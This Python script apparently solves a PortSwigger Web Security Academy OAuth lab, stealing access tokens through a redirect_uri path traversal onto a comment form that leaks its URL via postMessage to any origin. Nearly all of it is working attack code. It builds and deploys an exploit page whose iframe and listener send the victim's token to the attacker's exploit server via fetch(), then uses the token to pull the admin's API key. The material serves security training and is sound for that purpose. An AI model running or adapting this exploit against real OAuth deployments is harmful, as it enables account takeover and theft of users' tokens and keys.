#!/usr/bin/env python3
"""
Stealing OAuth access tokens via a proxy page
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 05-stealing-oauth-access-tokens-via-a-proxy-page.md

What this does:
    Same redirect_uri prefix-match traversal as the open-redirect lab, but this
    client has no open redirect to chain it to. Instead, the comment form embedded
    on blog posts (/post/comment/comment-form) calls
    parent.postMessage({type:'onload', data: window.location.href}, '*') on load --
    sending its own full URL, fragment included, to any parent window regardless of
    origin. The script traverses redirect_uri onto that comment form, builds an
    exploit page that iframes the crafted authorization URL directly and listens
    for the postMessage, and fetches whatever URL the comment form reports back to
    its own /<url> endpoint on the exploit server -- landing the URL-encoded
    access_token straight in the access log. It decodes the token, calls /me on the
    OAuth provider, and submits the recovered API key.

Usage:
    python 05-stealing-oauth-access-tokens-via-a-proxy-page.py <lab-url>
    e.g. python 05-stealing-oauth-access-tokens-via-a-proxy-page.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = c.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] No exploit server found on the lab homepage.")
        return
    exploit_server = exploit_m.group(1)
    print(f"[*] Exploit server: {exploit_server}")

    # Step 1: discover the OAuth flow (handles both a 302 and a meta-refresh).
    print("[*] Discovering OAuth flow...")
    r = c.get(f"{lab_url}/social-login", follow_redirects=False)
    location = r.headers.get("location", "")
    if not location and r.status_code == 200:
        meta = re.search(r'url=([^\'">\s]+)', r.text)
        if meta:
            location = meta.group(1)

    if not location:
        print("[-] Could not find the OAuth redirect URL.")
        return

    parsed = urllib.parse.urlparse(location)
    params = urllib.parse.parse_qs(parsed.query)
    oauth_origin = f"{parsed.scheme}://{parsed.netloc}"
    auth_path = parsed.path
    client_id = params.get("client_id", [""])[0]
    original_redirect = params.get("redirect_uri", [""])[0]

    print(f"[*] OAuth: {oauth_origin}, client: {client_id}")
    print(f"[*] Redirect: {original_redirect}")

    # Step 2: confirm the comment form leaks its own URL via postMessage.
    comment_form = c.get(f"{lab_url}/post/comment/comment-form")
    if "postMessage" not in comment_form.text:
        print("[-] No postMessage found in the comment form.")
        return
    print("[+] Comment form has postMessage({data: window.location.href}, '*')")

    # Step 3: traverse redirect_uri onto the comment form.
    traversal_redirect = f"{original_redirect}/../post/comment/comment-form"

    auth_url = (
        f"{oauth_origin}{auth_path}"
        f"?client_id={client_id}"
        f"&redirect_uri={urllib.parse.quote(traversal_redirect, safe='')}"
        f"&response_type=token"
        f"&nonce=1"
        f"&scope=openid%20profile%20email"
    )

    # Step 4: iframe the crafted auth URL directly (no intermediate navigation --
    # our exploit page stays the iframe's real parent the whole time) and read
    # e.data.data off the postMessage the comment form fires on load.
    exploit_body = (
        f'<iframe src="{auth_url}"></iframe>\n'
        "<script>\n"
        "window.addEventListener('message', function(e) {\n"
        "    if (e.data.data) {\n"
        "        fetch('/' + encodeURIComponent(e.data.data));\n"
        "    }\n"
        "}, false);\n"
        "</script>"
    )

    print("[*] Deploying postMessage listener exploit...")
    c.post(
        f"{exploit_server}/",
        data={
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "responseBody": exploit_body,
            "formAction": "STORE",
        },
    )

    c.get(f"{exploit_server}/deliver-to-victim")
    print("[*] Exploit delivered, waiting for token...")
    time.sleep(5)

    # Step 5: the token arrives URL-encoded in the log (access_token%3DTOKEN),
    # since it's the tail end of a fetch() to /<url-encoded location>.
    log = c.get(f"{exploit_server}/log").text
    decoded_log = urllib.parse.unquote(log)
    tokens = re.findall(r'access_token=([A-Za-z0-9_-]+)', decoded_log)

    if not tokens:
        time.sleep(5)
        log = c.get(f"{exploit_server}/log").text
        decoded_log = urllib.parse.unquote(log)
        tokens = re.findall(r'access_token=([A-Za-z0-9_-]+)', decoded_log)

    if not tokens:
        print("[-] No access token captured from the proxy page.")
        return

    stolen_token = tokens[-1]
    print(f"[+] Stolen access token: {stolen_token[:30]}...")

    # Step 6: get the admin's API key from /me on the OAuth provider.
    r = c.get(f"{oauth_origin}/me", headers={"Authorization": f"Bearer {stolen_token}"})
    if r.status_code != 200:
        r = c.get(f"{oauth_origin}/userinfo", headers={"Authorization": f"Bearer {stolen_token}"})
    print(f"[+] User info: {r.text[:200]}")

    api_key_match = re.search(r'"apikey"\s*:\s*"([^"]+)"', r.text)
    if api_key_match:
        api_key = api_key_match.group(1)
        print(f"[+] Admin API key: {api_key}")
        c.post(f"{lab_url}/submitSolution", data={"answer": api_key})

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
